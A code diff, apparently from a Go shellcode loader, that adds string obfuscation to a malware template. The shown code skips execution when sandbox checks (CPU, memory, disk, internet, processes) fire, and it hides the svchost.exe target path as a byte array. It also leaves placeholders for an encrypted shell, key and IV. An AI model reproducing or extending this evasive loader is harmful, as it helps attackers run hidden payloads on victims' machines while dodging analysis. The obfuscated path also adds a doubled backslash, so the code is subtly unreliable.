@@ -126,7 +126,6 @@ func CheckSandbox() bool {
 
 	processSandbox := checkProcesses()
 
-    // Combining the sandbox checks with a common logic
     return cpuSandbox || memorySandbox || diskSandbox || internetSandbox || processSandbox
 }
 
@@ -134,11 +133,14 @@ func main() {
     if CheckSandbox() {
         return 
     }
-	path := "C:\\Windows\\system32\\svchost.exe"
-  //insert here your encrypted shell
+	epath := []byte{
+		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
+	}
+	path := string(epath)  
+	//insert here your encrypted shell
 	sch := []byte("")
-	key := []byte("\x4b\x2e\x1b\x86\x8c\x51\xf5\x02\x4b\xf2\x2b\x6a\xdc\xb6\xd1\x3d\x0c\xeb\xc1\xdb\x88\xc0\x84\xe1")
-	iv := []byte("\x27\x42\x6e\x6b\x0b\x39\x7f\xf8")
+	key := []byte("")
+	iv := []byte("")
 
 	_, err := os.Stat(path)
 	if err != nil {
